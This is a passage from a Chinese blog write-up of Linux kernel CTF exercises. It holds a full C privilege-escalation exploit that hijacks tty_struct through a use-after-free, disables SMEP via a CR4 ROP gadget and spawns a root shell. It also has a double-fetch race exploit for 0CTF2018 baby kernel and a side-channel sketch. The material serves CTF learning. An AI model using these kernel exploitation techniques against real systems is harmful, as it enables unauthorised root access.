*tty, <span class="hljs-keyword">struct</span> serial_struct *p);<br>	<span class="hljs-type">void</span> (*show_fdinfo)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> seq_file *m);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span><br>	<span class="hljs-type">int</span> (*poll_init)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> *options);<br>	<span class="hljs-type">int</span> (*poll_get_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line);<br>	<span class="hljs-type">void</span> (*poll_put_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> ch);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>	<span class="hljs-type">int</span> (*proc_show)(<span class="hljs-keyword">struct</span> seq_file *, <span class="hljs-type">void</span> *);<br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure>

<p>这里我们执行到ROP链后写cr4寄存器为0x6f0来绕过SMEP,然后打ret2user，但这里每次提权成功后返回userland的时候到swapgs后的pop rbp总会报错</p>
<pre><code class="hljs">   0xffffffff81063694 &lt;native_swapgs+4&gt;      swapgs 
 ► 0xffffffff81063697 &lt;native_swapgs+7&gt;      pop    rbp
   0xffffffff81063698 &lt;native_swapgs+8&gt;      ret    
    ↓
   0xffffffff814e35ef &lt;tty_audit_log+239&gt;    iretq  
   0xffffffff814e35f1 &lt;tty_audit_log+241&gt;    ret    
 
   0xffffffff814e35f2 &lt;tty_audit_log+242&gt;    dec    dword ptr [rax - 0x75]
   0xffffffff814e35f5 &lt;tty_audit_log+245&gt;    push   rbp
   0xffffffff814e35f6 &lt;tty_audit_log+246&gt;    test   al, init_module+36            &lt;72&gt;
   0xffffffff814e35f8 &lt;tty_audit_log+248&gt;    mov    esi, dword ptr [rbp - 0x50]
   0xffffffff814e35fb &lt;tty_audit_log+251&gt;    mov    rdi, rbx
   0xffffffff814e35fe &lt;tty_audit_log+254&gt;    call   audit_log_n_hex            &lt;audit_log_n_hex&gt;
──────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffeb93ba830 ◂— 0x0
01:0008│     0x7ffeb93ba838 —▸ 0xffffffff814e35ef (tty_audit_log+239) ◂— iretq  
02:0010│     0x7ffeb93ba840 —▸ 0x402001 ◂— endbr64 
03:0018│     0x7ffeb93ba848 ◂— 0x33 /* &#39;3&#39; */
04:0020│     0x7ffeb93ba850 ◂— 0x246
05:0028│     0x7ffeb93ba858 —▸ 0x7ffeb93ba7d0 —▸ 0xffff880005fc7758 ◂— 0xcc
06:0030│     0x7ffeb93ba860 ◂— 0x2b /* &#39;+&#39; */
07:0038│     0x7ffeb93ba868 ◂— 0x0
──────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 0xffffffff81063697 native_swapgs+7
──────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg&gt; i all-registers cr3
cr3            0x5fe2000           [ PDBR=2 PCID=0 ]
</code></pre>
<p>据推测这里因该确实是KPTI开启的情况，但为什么加了nopti还是有这个存在呢，难以理解，但是本题利用的过程算是摸清楚了</p>
<p>exp如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><span class="hljs-comment">#include &lt;fcntl.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/ioctl.h&gt;</span><br><span class="hljs-comment">#include &lt;unistd.h&gt;</span><br><span class="hljs-comment">#include &lt;ctype.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/mman.h&gt;</span><br><span class="hljs-comment">#include &lt;string.h&gt;</span><br><span class="hljs-comment">#include &lt;sched.h&gt;</span><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#define __USE_GNU</span><br><span class="hljs-comment">#include &lt;pthread.h&gt;</span><br><br>size_t prepare_kernel_cred = <span class="hljs-number">0xffffffff810a1810</span>;<br>size_t commit_creds = <span class="hljs-number">0xffffffff810a1420</span>;<br>size_t init_cred = <span class="hljs-number">0xffffffff82a6b700</span>;<br>const size_t pop_rdi = <span class="hljs-number">0xffffffff810d238d</span>;<br>const size_t pop_rsi = <span class="hljs-number">0xffffffff811dd9ae</span>;<br>const size_t pop_rdx = <span class="hljs-number">0xffffffff81440b72</span>;<br>const size_t mov_rc4_rdi_pop_rbp = <span class="hljs-number">0xffffffff81004d80</span>;<br>const size_t swapgs_pop_rbp = <span class="hljs-number">0xffffffff81063694</span>;<br>const size_t iretq = <span class="hljs-number">0xffffffff8181a797</span>;<br>const size_t mov_rsp_rax_ret = <span class="hljs-number">0xffffffff8181bfc5</span>;<br>const size_t pop_rax_ret = <span class="hljs-number">0xffffffff8100ce6e</span>;<br>const size_t mov_rdi_rax_pop2 = <span class="hljs-number">0xffffffff8133b32e</span>;<br><br><span class="hljs-comment">#define PRINT_ADDR(str, x) printf(&quot;\033[0m\033[1;34m[+]%s \033[0m:%p\n&quot;, str, x)</span><br><br><br>void info_log(char*);<br>void error_log(char*);<br>void saveStatus();<br>void get_shell();<br>void getRootPrivilige();<br>void bind_cpu(<span class="hljs-built_in">int</span>);<br><br>size_t user_cs, user_ss, user_rflags, user_sp;<br><br><br>void saveStatus()&#123;<br>  __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>          <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>          <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>          <span class="hljs-string">&quot;pushf;&quot;</span><br>          <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>          );<br>  info_log(<span class="hljs-string">&quot;Status has been saved Successfully!&quot;</span>);<br>&#125;<br><br><br>void info_log(char* <span class="hljs-built_in">str</span>)&#123;<br>  printf(<span class="hljs-string">&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;</span>,<span class="hljs-built_in">str</span>);<br>&#125;<br><br>void error_log(char* <span class="hljs-built_in">str</span>)&#123;<br>  printf(<span class="hljs-string">&quot;\033[0m\033[1;31m%s\033[0m\n&quot;</span>,<span class="hljs-built_in">str</span>);<br>  exit(<span class="hljs-number">1</span>);<br>&#125;<br><br>void get_shell()&#123;<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><br>void getRootPrivilige(void)<br>&#123;<br>    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;<br>    <span class="hljs-built_in">int</span> (*commit_creds_ptr)(void *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));<br>&#125;<br><br>void main()&#123;<br>  saveStatus();<br>  <span class="hljs-built_in">int</span> i; <br><br>  size_t buff[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  size_t rop[<span class="hljs-number">0x100</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  size_t fake_tty_operations[<span class="hljs-number">0x30</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  PRINT_ADDR(<span class="hljs-string">&quot;fake_tty_operations&quot;</span>, fake_tty_operations);<br>  size_t tty_struct_padding[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <br>  <span class="hljs-built_in">int</span> p = <span class="hljs-number">0</span>;<br>  rop[p++] = pop_rdi;<br>  rop[p++] = <span class="hljs-number">0x6f0</span>;<br>  rop[p++] = mov_rc4_rdi_pop_rbp;<br>  rop[p++] =((size_t)&amp;rop&amp;(~<span class="hljs-number">0xfff</span>));<br>  rop[p++] = getRootPrivilige;<br>  rop[p++] = swapgs_pop_rbp;<br>  rop[p++] = ((size_t)&amp;rop&amp;(~<span class="hljs-number">0xfff</span>));<br>  rop[p++] = iretq;<br>  rop[p++] = get_shell;<br>  rop[p++] = user_cs;<br>  rop[p++] = user_rflags;<br>  rop[p++] = user_sp;<br>  rop[p++] = user_cs;<br><br><br>  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)&#123;<br>    fake_tty_operations[i] = mov_rsp_rax_ret;<br>  &#125;<br>  fake_tty_operations[<span class="hljs-number">0</span>] = pop_rax_ret;<br>  fake_tty_operations[<span class="hljs-number">1</span>] = rop;<br>  <span class="hljs-built_in">int</span> fd1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br>  <span class="hljs-built_in">int</span> fd2 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br><br>  ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0x2e0</span>);<br>  close(fd1);<br>  //alloc the UAF chunk to tty_struct<br>  <span class="hljs-built_in">int</span> fd3 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, <span class="hljs-number">2</span>);<br>  <br>  //overwrite the tty_struct-&gt;ops<br>  read(fd2, tty_struct_padding, <span class="hljs-number">0x30</span>);<br>  tty_struct_padding[<span class="hljs-number">3</span>] = fake_tty_operations;<br>  write(fd2, tty_struct_padding, <span class="hljs-number">0x30</span>);<br>  write(fd3, buff, <span class="hljs-number">0x10</span>);<br><br>&#125;<br><br></code></pre></td></tr></table></figure>

<h1 id="四-Race-Condition"><a href="#四-Race-Condition" class="headerlink" title="四 Race Condition"></a>四 Race Condition</h1><h2 id="例题：0CTF2018-Final-baby-kernel"><a href="#例题：0CTF2018-Final-baby-kernel" class="headerlink" title="例题：0CTF2018 Final - baby kernel"></a>例题：0CTF2018 Final - baby kernel</h2><h3 id="1-题目逆向-1"><a href="#1-题目逆向-1" class="headerlink" title="1. 题目逆向"></a>1. 题目逆向</h3><p>整个模块就实现了ioctl，如下：</p>
<pre><code class="hljs">__int64 __fastcall baby_ioctl(__int64 a1, __int64 a2)
&#123;
  __int64 v2; // rdx
  int i; // [rsp-5Ch] [rbp-5Ch]
  __int64 v5; // [rsp-58h] [rbp-58h]

  _fentry__(a1, a2);
  v5 = v2;
  if ( a2 == 0x6666 )
  &#123;
    printk(&quot;Your flag is at %px! But I don&#39;t think you know it&#39;s content\n&quot;, flag);
    return 0LL;
  &#125;
  else if ( a2 == 0x1337
         &amp;&amp; !_chk_range_not_ok(v2, 16LL, *(__readgsqword(&amp;current_task) + 0x1358))// check1:检查传递结构体的范围是否小于0x7ffff...
         &amp;&amp; !_chk_range_not_ok(*v5, *(v5 + 8), *(__readgsqword(&amp;current_task) + 0x1358))// check2:检查结构体内容的范围是否小于0x7ffff...
         &amp;&amp; *(v5 + 8) == strlen(flag) )         // check3:检查长度是否等于flag
  &#123;
    for ( i = 0; i &lt; strlen(flag); ++i )
    &#123;
      if ( *(*v5 + i) != flag[i] )
        return 22LL;
    &#125;
    printk(&quot;Looks like the flag is not a secret anymore. So here is it %s\n&quot;, flag);
    return 0LL;
  &#125;
  else
  &#123;
    return 14LL;
  &#125;
&#125;
</code></pre>
<p>这里可以看到他是首先给出了flag的地址，然后再与我们传入的数据结构进行比较，其中有三个check</p>
<ol>
<li>检查我们的传入数据结构是否位于用户态（这里的(&amp;current_task)+0x1358的值是可以通过动调知道）</li>
<li>检查我们传入数据结构指向的块是否位于用户态</li>
<li>检查指向块的长度是否位于用户态</li>
</ol>
<p>检查完毕后再来查看我们传入的块里面的数据是否等于flag值，如果等于则打印在内核输出当中</p>
<h3 id="2-double-fetch"><a href="#2-double-fetch" class="headerlink" title="2.double fetch"></a>2.double fetch</h3><p>这里的doube fetch就是两次取的意思，我们可以知道，在内核检测数据的过程中，以及到达开始比较的过程当中，这一段缝隙对于人来说可能是十分短且可以忽略的地方，而对于程序来说那就不是这样了，我们可以充分利用这段间隙，在该地址通过检测的情况下再立刻修改他指向的值，这样就可以绕过检测，这里给出a3师傅的图</p>
<p><img src="https://i.loli.net/2021/09/08/GOSsNPkuMZHlUmT.png" srcset="/img/loading.gif" lazyload></p>
<p>这里值得注意的一点就是再我们使用<code>pthread</code>函数簇的时候，记得编译选项加上<code>-lpthread</code><br>我们的exp如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:%p\n&quot;</span>, str, x)</span><br><br><span class="hljs-type">pthread_t</span> compete_thread;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x30</span>] = <span class="hljs-string">&quot;peiwithhao&quot;</span>;<br><span class="hljs-type">int</span> competition_time = <span class="hljs-number">0x1000</span>, status = <span class="hljs-number">1</span>;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> real_addr;<br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>  <span class="hljs-type">void</span>* flag_addr;<br>  <span class="hljs-type">size_t</span> flag_len;<br>&#125;flag = &#123;.flag_addr = buf, .flag_len = <span class="hljs-number">33</span>&#125;;<br><br><span class="hljs-type">void</span>* <span class="hljs-title function_">competition_thread</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>  <span class="hljs-keyword">while</span>(status)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i&lt; competition_time ; i++)&#123;<br>      flag.flag_addr = real_addr;<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br>  <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/baby&quot;</span>, <span class="hljs-number">2</span>);<br>  ioctl(fd, <span class="hljs-number">0x6666</span>);<br>  system(<span class="hljs-string">&quot;dmesg | grep flag &gt; addr.txt&quot;</span>);<br>  <span class="hljs-type">int</span> addr_fd = open(<span class="hljs-string">&quot;/addr.txt&quot;</span>, <span class="hljs-number">0</span>);<br>  lseek(addr_fd, <span class="hljs-number">31</span>, SEEK_SET);<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">char</span>* temp = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>  buf[read(addr_fd, buf, <span class="hljs-number">0x10</span>)] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>  <span class="hljs-built_in">sscanf</span>(buf, <span class="hljs-string">&quot;%lx&quot;</span>, &amp;real_addr);<br>  PRINT_ADDR(<span class="hljs-string">&quot;flag&quot;</span>, real_addr);<br><br>  pthread_create(&amp;compete_thread, <span class="hljs-literal">NULL</span>, competition_thread, <span class="hljs-literal">NULL</span>);<br>  <span class="hljs-keyword">while</span>(status)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; competition_time ; i++)&#123;<br>      flag.flag_addr = buf;<br>      ioctl(fd, <span class="hljs-number">0x1337</span>, &amp;flag);<br>    &#125;<br>    system(<span class="hljs-string">&quot;dmesg | grep flag &gt; result.txt&quot;</span>);<br>    <span class="hljs-type">int</span> result_fd = open(<span class="hljs-string">&quot;/result.txt&quot;</span>, <span class="hljs-number">0</span>);<br>    read(result_fd, temp, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(temp, <span class="hljs-string">&quot;flag&#123;&quot;</span>))&#123;<br>      status = <span class="hljs-number">0</span>;<br>    &#125;<br><br>  &#125;<br>  pthread_cancel(compete_thread);<br>  info_log(<span class="hljs-string">&quot;finish&quot;</span>);<br>  system(<span class="hljs-string">&quot;dmesg | grep flag&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="3-侧信道"><a href="#3-侧信道" class="headerlink" title="3. 侧信道"></a>3. 侧信道</h3><p>顾名思义，其就是使用一种完全偏离正常解题思路的一种攻击手段，譬如更加像物理黑客那样达成自己的目的，有的侧信道解法甚至使用到加解密判断中运行时长的差别来判断整体程序的运行。本题同样存在侧信道解法。</p>
<p>我们在上面都接触到，只有题目中传递到了正确的flag值我们才可以获取flag，但是就这么个检查flag的过程是一个字节一个字节检测的，所以说我们可以采用下面这个思路：</p>
<ol>
<li>我们每次传递一定长度的flag值，并逐位进行爆破</li>
<li>每次判断正确的办法也很简单，如果我们传递了错误的值，程序就会正常退出，如果我们传递正确的值该怎么办呢，这里给出解答，我们可以mmap出一页范围，然后将部分flag置于页末尾，那么如果我们flag的最后一个符号匹配，程序就会接着往后面访问判断是否匹配，但是这就到了下一页，其大概率会出现访问panic</li>
</ol>
<p>大致情况如下：</p>
<p><img src="/./cxd.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="∞-参考链接"><a href="#∞-参考链接" class="headerlink" title="∞ 参考链接"></a>∞ 参考链接</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://arttnba3.cn/">https://arttnba3.cn/</a></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blingblingxuanxuan.github.io/">https://blingblingxuanxuan.github.io/</a></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://kiprey.gitee.io/2021/10/kernel_pwn_introduction/#3-tty-struct-%E7%BB%93%E6%9E%84%E7%9A%84%E5%88%A9%E7%94%A8">https://kiprey.gitee.io/2021/10/kernel_pwn_introduction&#x2F;</a></p>
</blockquote>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Linux-Kernel/" class="category-chain-item">Linux Kernel</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/pwn/">#pwn</a>
      
        <a href="/tags/kernel/">#kernel</a>
      
        <a href="/tags/ctf/">#ctf</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Linux-Kernel-0x02-Practice</div>
      <div>https://peiandhao.github.io/2023/06/24/Linux-Kernel-0x02-Practice/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>peiwithhao</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年6月24日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/06/22/KVM-Qemu/" title="KVM_Qemu">
                        <span class="hidden-mobile">KVM_Qemu</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"Afm6UeM0VL6RfMOLAgwtyxs8-gzGzoHsz","appKey":"Vr60qrZIptqhJaXqWvDEknkH","path":"window.location.pathname","placeholder":"锐评一下","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <div> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Pei</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Hao</span></a> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
